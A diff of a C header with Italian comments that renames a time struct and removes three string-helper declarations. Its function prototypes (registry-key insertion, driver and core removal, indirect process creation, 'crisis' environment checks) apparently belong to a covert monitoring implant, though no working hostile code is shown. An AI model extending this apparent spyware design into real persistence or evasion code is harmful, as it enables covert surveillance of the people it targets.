@@ -15,7 +15,7 @@
 typedef struct {
 	DWORD lo_delay; 
 	DWORD hi_delay; 
-} nanosec_time; 
+} NANOSEC_TIME; 
 
 // Funzioni esportate
 extern void HM_InsertRegistryKey(char *, BOOL);
@@ -30,18 +30,15 @@ extern void HM_RemoveDriver();
 extern void HM_RemoveCore(void);
 extern BOOL HM_GetDefaultBrowser(char *);
 extern BOOL HM_GetIE32Browser(char *path_name);
-void HM_U2A(char *);
-void HM_A2U(char *src, char *dst);
-char *HM_memstr(char *, char *);
 
 extern BOOL HM_CheckNewConf(char *);
-extern BOOL HM_GetDate(nanosec_time *);
+extern BOOL HM_GetDate(NANOSEC_TIME *);
 extern char *HM_ReadClearConf(char *);
 extern BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize);
 extern BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize);
 extern BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size);
 extern void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, BOOL inherit);
-extern void HM_CalcDateDelta(long long, nanosec_time *);
+extern void HM_CalcDateDelta(long long, NANOSEC_TIME *);
 void *memmem (const void *haystack, size_t haystack_len, const void *needle, size_t needle_len);
 extern BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime);
 extern BOOL IsLastInstance();
@@ -56,7 +53,7 @@ extern BOOL IsCrisisNetwork(void);
 extern BOOL IsCrisisSystem(void);
 
 // Viene usata anche dagli event handlers delle date
-extern nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
+extern NANOSEC_TIME date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
 
 // Tpi delle funzioni importate dinamicamente.....
 //
